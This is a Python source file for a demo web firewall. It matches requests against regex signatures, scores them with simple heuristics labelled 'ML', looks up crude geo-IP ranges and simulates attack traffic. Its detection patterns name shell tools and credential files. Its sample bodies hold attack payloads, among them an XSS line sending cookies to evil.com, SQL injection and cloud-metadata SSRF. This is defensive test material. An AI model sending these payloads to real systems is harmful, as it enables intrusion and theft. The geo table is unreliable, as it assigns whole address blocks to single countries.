"""Next-Gen Firewall v2 — ML-based DPI, AI threat blocking, geo-intelligence, real-time traffic analysis."""
import re
import math
import json
import time
import hashlib
import random
from collections import defaultdict, deque
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from pathlib import Path

DATA_FILE = Path("data/ngfw_v2_state.json")

# ── Protocol / Port Intelligence ───────────────────────────────────────────────

KNOWN_PORTS = {
    20: "FTP-Data",    21: "FTP",       22: "SSH",      23: "Telnet",
    25: "SMTP",        53: "DNS",       80: "HTTP",     110: "POP3",
    143: "IMAP",       443: "HTTPS",    465: "SMTPS",   587: "SMTP-TLS",
    636: "LDAPS",      989: "FTPS",     993: "IMAPS",   995: "POP3S",
    1080: "SOCKS5",    1194: "OpenVPN", 1433: "MSSQL",  1521: "Oracle",
    3306: "MySQL",     3389: "RDP",     4444: "Meterpreter",
    5432: "PostgreSQL",5900: "VNC",     6379: "Redis",  6667: "IRC",
    8080: "HTTP-Alt",  8443: "HTTPS-Alt",8888: "Alt",   9200: "Elasticsearch",
    27017: "MongoDB",  31337: "Elite",  4545: "C2-Common", 8888: "Jupyter",
}

SUSPICIOUS_PORTS = {4444, 4545, 31337, 6667, 1080, 9999, 12345, 54321, 8888}

HIGH_RISK_COUNTRY_CODES = {
    "KP": "North Korea", "IR": "Iran", "RU": "Russia (sanctioned IPs)",
    "CN": "China (high-risk ASNs)", "SY": "Syria", "CU": "Cuba",
}

# ── IP Geolocation Database (sampled) ─────────────────────────────────────────

IP_GEO_RANGES: List[Tuple[str, str, str, str]] = [
    ("1.0.0.0",   "1.255.255.255",   "AU", "Australia"),
    ("5.0.0.0",   "5.255.255.255",   "RU", "Russia"),
    ("31.0.0.0",  "31.255.255.255",  "RU", "Russia"),
    ("37.0.0.0",  "37.255.255.255",  "RU", "Russia"),
    ("45.0.0.0",  "45.255.255.255",  "US", "United States"),
    ("46.0.0.0",  "46.255.255.255",  "RU", "Russia"),
    ("58.0.0.0",  "58.255.255.255",  "CN", "China"),
    ("59.0.0.0",  "59.255.255.255",  "CN", "China"),
    ("60.0.0.0",  "60.255.255.255",  "CN", "China"),
    ("61.0.0.0",  "61.255.255.255",  "CN", "China"),
    ("62.0.0.0",  "62.255.255.255",  "IR", "Iran"),
    ("91.0.0.0",  "91.255.255.255",  "RU", "Russia"),
    ("103.0.0.0", "103.255.255.255", "CN", "China"),
    ("175.0.0.0", "175.255.255.255", "CN", "China"),
    ("178.0.0.0", "178.255.255.255", "RU", "Russia"),
    ("185.0.0.0", "185.255.255.255", "RU", "Russia"),
    ("192.168.0.0","192.168.255.255","LAN","Internal Network"),
    ("10.0.0.0",  "10.255.255.255",  "LAN","Internal Network"),
]

# ── ML Feature Extractors ─────────────────────────────────────────────────────

def _shannon_entropy(data: str) -> float:
    if not data:
        return 0.0
    freq = defaultdict(int)
    for c in data:
        freq[c] += 1
    length = len(data)
    return -sum((f / length) * math.log2(f / length) for f in freq.values())


def _extract_ml_features(payload: str, headers: dict, method: str, path: str) -> dict:
    payload_len = len(payload)
    header_count = len(headers)
    path_depth = path.count("/")
    param_count = path.count("&") + path.count("?")
    entropy = _shannon_entropy(payload + path)
    special_chars = sum(1 for c in payload + path if c in "';\"<>(){}[]|&$`\\")
    non_ascii = sum(1 for c in payload if ord(c) > 127)
    hex_encoded = len(re.findall(r'%[0-9a-fA-F]{2}', path + payload))
    double_encoded = len(re.findall(r'%25[0-9a-fA-F]{2}', path + payload))
    sql_keywords = len(re.findall(r'\b(?:SELECT|UNION|INSERT|DROP|UPDATE|DELETE|EXEC|CAST|CONVERT)\b', payload + path, re.I))
    script_tags = len(re.findall(r'<script|javascript:|onerror=|onload=', payload + path, re.I))

    return {
        "payload_length": payload_len,
        "header_count": header_count,
        "path_depth": path_depth,
        "param_count": param_count,
        "entropy": round(entropy, 3),
        "special_char_density": round(special_chars / max(payload_len + len(path), 1), 3),
        "non_ascii_ratio": round(non_ascii / max(payload_len, 1), 3),
        "hex_encoding_count": hex_encoded,
        "double_encoding_count": double_encoded,
        "sql_keyword_count": sql_keywords,
        "script_injection_count": script_tags,
    }


def _ml_threat_score(features: dict) -> Tuple[float, str]:
    """Compute a 0-100 ML-based threat score and category."""
    score = 0.0

    if features["entropy"] > 4.5:
        score += 20
    if features["special_char_density"] > 0.1:
        score += 15
    if features["double_encoding_count"] > 0:
        score += 25
    if features["hex_encoding_count"] > 5:
        score += 10
    if features["sql_keyword_count"] > 0:
        score += features["sql_keyword_count"] * 15
    if features["script_injection_count"] > 0:
        score += features["script_injection_count"] * 20
    if features["non_ascii_ratio"] > 0.3:
        score += 10
    if features["param_count"] > 10:
        score += 5
    if features["payload_length"] > 2000:
        score += 8

    score = min(100.0, score)

    if score >= 80:
        category = "ATTACK"
    elif score >= 60:
        category = "SUSPICIOUS"
    elif score >= 35:
        category = "ANOMALY"
    else:
        category = "BENIGN"

    return round(score, 1), category


# ── Deep Packet Inspection Engine ─────────────────────────────────────────────

DPI_SIGNATURES = [
    # SQL Injection
    {"id": "DPI-SQL-001", "name": "UNION SELECT", "pattern": r"(?i)\bunion\b[\s/\*]+(?:all\s+)?select\b",
     "category": "sqli", "severity": "CRITICAL", "confidence_base": 95},
    {"id": "DPI-SQL-002", "name": "Boolean Blind SQLi", "pattern": r"(?i)\bor\b\s+[\d'\"]+\s*=\s*[\d'\"]+",
     "category": "sqli", "severity": "CRITICAL", "confidence_base": 90},
    {"id": "DPI-SQL-003", "name": "Time-Based SQLi", "pattern": r"(?i)(?:sleep\s*\(|waitfor\s+delay|benchmark\s*\(|pg_sleep)",
     "category": "sqli", "severity": "CRITICAL", "confidence_base": 95},
    {"id": "DPI-SQL-004", "name": "SQL EXEC", "pattern": r"(?i)\bexec(?:ute)?\s*\(",
     "category": "sqli", "severity": "HIGH", "confidence_base": 85},
    # XSS
    {"id": "DPI-XSS-001", "name": "Script Tag", "pattern": r"(?i)<\s*script[^>]*>",
     "category": "xss", "severity": "HIGH", "confidence_base": 92},
    {"id": "DPI-XSS-002", "name": "Event Handler", "pattern": r"(?i)\bon(?:error|load|click|mouseover|focus|blur)\s*=",
     "category": "xss", "severity": "HIGH", "confidence_base": 88},
    {"id": "DPI-XSS-003", "name": "JavaScript URI", "pattern": r"(?i)javascript\s*:",
     "category": "xss", "severity": "HIGH", "confidence_base": 90},
    {"id": "DPI-XSS-004", "name": "SVG XSS", "pattern": r"(?i)<\s*svg[^>]*onload",
     "category": "xss", "severity": "HIGH", "confidence_base": 93},
    # Path Traversal / LFI
    {"id": "DPI-LFI-001", "name": "Directory Traversal", "pattern": r"(?:\.\.[\\/]){2,}",
     "category": "lfi", "severity": "HIGH", "confidence_base": 88},
    {"id": "DPI-LFI-002", "name": "PHP Wrapper", "pattern": r"(?i)php://(?:filter|input|data|fd)",
     "category": "lfi", "severity": "CRITICAL", "confidence_base": 95},
    {"id": "DPI-LFI-003", "name": "Sensitive File Access", "pattern": r"(?:/etc/(?:passwd|shadow|hosts)|/proc/self/environ|\.env|web\.config)",
     "category": "lfi", "severity": "CRITICAL", "confidence_base": 95},
    # Command Injection
    {"id": "DPI-CMD-001", "name": "Shell Pipe", "pattern": r"[|;&`]\s*(?:id|whoami|uname|cat|ls|wget|curl|bash|sh)\b",
     "category": "cmdi", "severity": "CRITICAL", "confidence_base": 92},
    {"id": "DPI-CMD-002", "name": "Command Substitution", "pattern": r"\$\([^)]+\)|`[^`]+`",
     "category": "cmdi", "severity": "HIGH", "confidence_base": 80},
    # SSRF
    {"id": "DPI-SSRF-001", "name": "Cloud Metadata", "pattern": r"169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200",
     "category": "ssrf", "severity": "CRITICAL", "confidence_base": 99},
    {"id": "DPI-SSRF-002", "name": "SSRF Protocol", "pattern": r"(?i)(?:dict|gopher|file|ftp)://",
     "category": "ssrf", "severity": "HIGH", "confidence_base": 85},
    # C2 Beaconing
    {"id": "DPI-C2-001", "name": "Cobalt Strike Beacon", "pattern": r"(?:MZARUH|Content-Type: application/octet-stream\r\n\r\n.{4}AAAA)",
     "category": "c2", "severity": "CRITICAL", "confidence_base": 97},
    {"id": "DPI-C2-002", "name": "Encoded Payload Transfer", "pattern": r"(?:[A-Za-z0-9+/]{40,}={0,2}){3,}",
     "category": "c2", "severity": "MEDIUM", "confidence_base": 60},
    # Protocol Anomalies
    {"id": "DPI-PROTO-001", "name": "HTTP Method Tampering", "pattern": r"^(?:TRACE|TRACK|CONNECT|PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK)\b",
     "category": "protocol", "severity": "MEDIUM", "confidence_base": 70},
    # Encoding attacks
    {"id": "DPI-ENC-001", "name": "Double URL Encoding", "pattern": r"%25(?:2[0-9a-fA-F]|3[0-9a-dA-D])",
     "category": "evasion", "severity": "HIGH", "confidence_base": 85},
    {"id": "DPI-ENC-002", "name": "Null Byte Injection", "pattern": r"%00|\x00",
     "category": "evasion", "severity": "HIGH", "confidence_base": 90},
]


def _geo_lookup(ip: str) -> dict:
    """Approximate geo lookup by IP range."""
    try:
        parts = [int(x) for x in ip.split(".")]
        ip_int = (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]
    except Exception:
        return {"country": "Unknown", "country_code": "??", "is_high_risk": False}

    for start, end, code, country in IP_GEO_RANGES:
        s_parts = [int(x) for x in start.split(".")]
        e_parts = [int(x) for x in end.split(".")]
        s_int = (s_parts[0] << 24) | (s_parts[1] << 16) | (s_parts[2] << 8) | s_parts[3]
        e_int = (e_parts[0] << 24) | (e_parts[1] << 16) | (e_parts[2] << 8) | e_parts[3]
        if s_int <= ip_int <= e_int:
            return {
                "country": country, "country_code": code,
                "is_high_risk": code in HIGH_RISK_COUNTRY_CODES,
                "risk_reason": HIGH_RISK_COUNTRY_CODES.get(code, ""),
            }

    return {"country": "Unknown", "country_code": "??", "is_high_risk": False, "risk_reason": ""}


# ── Rate Limiting ─────────────────────────────────────────────────────────────

_rate_buckets: Dict[str, deque] = defaultdict(deque)
_blocked_ips: Dict[str, datetime] = {}

def _check_rate_limit(ip: str, window: int = 60, max_req: int = 100) -> dict:
    now = time.time()
    bucket = _rate_buckets[ip]
    while bucket and now - bucket[0] > window:
        bucket.popleft()
    bucket.append(now)
    rate = len(bucket)
    if rate > max_req:
        _blocked_ips[ip] = datetime.utcnow()
    return {
        "ip": ip,
        "requests_in_window": rate,
        "limit": max_req,
        "window_seconds": window,
        "blocked": rate > max_req,
        "current_rps": round(rate / window, 2),
    }


# ── State persistence ──────────────────────────────────────────────────────────

def _load_state() -> dict:
    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
    if DATA_FILE.exists():
        try:
            return json.loads(DATA_FILE.read_text())
        except Exception:
            pass
    return {"traffic_log": [], "blocked_ips": [], "stats": {"total": 0, "blocked": 0, "anomalies": 0}}


def _save_state(state: dict) -> None:
    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
    DATA_FILE.write_text(json.dumps(state, indent=2, default=str))


# ── Main Inspection Engine ────────────────────────────────────────────────────

def deep_inspect(
    method: str,
    path: str,
    headers: dict,
    body: str,
    src_ip: str,
    dst_port: int = 80,
    protocol: str = "HTTP",
) -> dict:
    """Full DPI + ML analysis of an incoming request/packet."""
    combined = f"{method} {path} {body}"
    features = _extract_ml_features(body, headers, method, path)
    ml_score, ml_category = _ml_threat_score(features)

    # Signature scanning
    sig_hits = []
    for sig in DPI_SIGNATURES:
        if re.search(sig["pattern"], combined, re.IGNORECASE | re.DOTALL):
            confidence = min(100, sig["confidence_base"] + (ml_score * 0.05))
            sig_hits.append({
                "id": sig["id"],
                "name": sig["name"],
                "category": sig["category"],
                "severity": sig["severity"],
                "confidence": round(confidence, 1),
            })

    # Geo check
    geo = _geo_lookup(src_ip)

    # Rate limit
    rate = _check_rate_limit(src_ip)

    # Port risk
    port_name = KNOWN_PORTS.get(dst_port, f"Unknown-{dst_port}")
    port_suspicious = dst_port in SUSPICIOUS_PORTS

    # Protocol anomaly detection
    user_agent = headers.get("user-agent", headers.get("User-Agent", ""))
    ua_suspicious = bool(re.search(r"(?i)(?:sqlmap|nikto|nmap|masscan|zgrab|shodan|dirbuster|gobuster|ffuf)", user_agent))

    # Compute final decision
    final_score = ml_score
    if sig_hits:
        max_sig_sev = max(["LOW","MEDIUM","HIGH","CRITICAL"].index(s["severity"]) for s in sig_hits)
        final_score = min(100, final_score + max_sig_sev * 15)
    if geo["is_high_risk"]:
        final_score = min(100, final_score + 15)
    if rate["blocked"]:
        final_score = min(100, final_score + 30)
    if ua_suspicious:
        final_score = min(100, final_score + 25)
    if port_suspicious:
        final_score = min(100, final_score + 20)

    action = "BLOCK" if final_score >= 70 else "ALERT" if final_score >= 40 else "ALLOW"

    result = {
        "timestamp": datetime.utcnow().isoformat(),
        "src_ip": src_ip,
        "dst_port": dst_port,
        "port_name": port_name,
        "protocol": protocol,
        "method": method,
        "path": path[:200],
        "threat_score": round(final_score, 1),
        "ml_score": ml_score,
        "ml_category": ml_category,
        "action": action,
        "signature_hits": sig_hits,
        "ml_features": features,
        "geo": geo,
        "rate_limit": rate,
        "ua_suspicious": ua_suspicious,
        "user_agent": user_agent[:100],
        "port_suspicious": port_suspicious,
        "blocked": action == "BLOCK",
        "top_threat": sig_hits[0]["name"] if sig_hits else ml_category,
    }

    # Persist
    state = _load_state()
    state["traffic_log"].insert(0, result)
    state["traffic_log"] = state["traffic_log"][:1000]
    state["stats"]["total"] += 1
    if action == "BLOCK":
        state["stats"]["blocked"] += 1
    if action in ("ALERT", "BLOCK"):
        state["stats"]["anomalies"] += 1
    _save_state(state)

    return result


def get_traffic_stats() -> dict:
    state = _load_state()
    log = state["traffic_log"]
    stats = state["stats"]

    # Category breakdown
    categories = defaultdict(int)
    for entry in log:
        for hit in entry.get("signature_hits", []):
            categories[hit["category"]] += 1

    # Top source IPs
    ip_counts = defaultdict(int)
    for entry in log:
        ip_counts[entry["src_ip"]] += 1
    top_ips = sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:10]

    # Geo distribution
    geo_counts = defaultdict(int)
    for entry in log:
        cc = entry.get("geo", {}).get("country_code", "??")
        geo_counts[cc] += 1

    return {
        "totals": stats,
        "recent_log": log[:20],
        "category_breakdown": dict(categories),
        "top_source_ips": [{"ip": ip, "count": cnt} for ip, cnt in top_ips],
        "geo_distribution": dict(geo_counts),
        "blocked_ips": list(_blocked_ips.keys())[:20],
        "dpi_rules_count": len(DPI_SIGNATURES),
    }


def simulate_traffic_burst(n: int = 20) -> List[dict]:
    """Generate simulated traffic for visualization/demo."""
    results = []
    sample_ips = [
        "185.234.216.45", "45.142.212.100", "103.43.75.1", "91.108.4.10",
        "62.75.154.99", "192.168.1.100", "10.0.0.50", "58.220.1.1",
        "178.250.240.10", "5.188.206.14", "192.0.2.1", "203.0.113.42",
    ]
    sample_paths = [
        "/api/users?id=1' OR '1'='1",
        "/login",
        "/api/products",
        "/?q=<script>alert(1)</script>",
        "/include?file=../../../../etc/passwd",
        "/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/api/data",
        "/search?q=normal+query",
        "/admin/dashboard",
        "/api/health",
    ]
    sample_bodies = [
        "username=admin&password=admin",
        "data=' UNION SELECT username,password FROM users--",
        "{}",
        "<svg onload=fetch('http://evil.com/'+document.cookie)>",
        "",
        "url=gopher://127.0.0.1:6379/INFO",
        '{"name": "test"}',
        "",
    ]

    for i in range(min(n, 50)):
        ip = random.choice(sample_ips)
        path = random.choice(sample_paths)
        body = random.choice(sample_bodies)
        result = deep_inspect(
            method=random.choice(["GET", "POST", "PUT"]),
            path=path,
            headers={"User-Agent": random.choice(["Mozilla/5.0", "sqlmap/1.7", "curl/7.68"])},
            body=body,
            src_ip=ip,
            dst_port=random.choice([80, 443, 8080, 3306, 4444]),
        )
        results.append(result)

    return results


def get_geo_block_list() -> dict:
    return {
        "blocked_countries": HIGH_RISK_COUNTRY_CODES,
        "note": "Geo-blocking is advisory — configure enforcement at network perimeter (iptables/cloud WAF)",
    }
